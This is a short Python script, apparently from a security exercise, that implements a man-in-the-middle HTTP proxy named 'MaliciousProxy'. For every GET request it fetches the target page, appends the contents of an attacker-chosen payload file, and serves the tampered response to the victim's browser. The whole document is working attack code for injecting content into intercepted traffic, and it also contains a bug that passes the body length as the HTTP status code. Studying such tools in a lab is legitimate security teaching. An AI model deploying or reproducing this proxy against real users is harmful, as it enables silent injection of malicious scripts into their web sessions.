import http.server
import urllib.request
import socketserver
import sys

if len(sys.argv) < 3:
    print('Usage: python3 mitm.py <port> <payload file>')
    exit(1)
class MaliciousProxy(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print('[*] Got request for: {}'.format(self.path))
        # Your code will go here
        payload = open(sys.argv[2], "r")
        response = urllib.request.urlopen(self.path).read().decode('utf-8')
        response += payload.read()
        response = response.encode('utf-8')
        self.send_response(len(response))
        self.end_headers()
        self.wfile.write(response)


port = int(sys.argv[1])
server = socketserver.ThreadingTCPServer(('', port), MaliciousProxy)
print("[*] Serving on port {}".format(port))
server.serve_forever()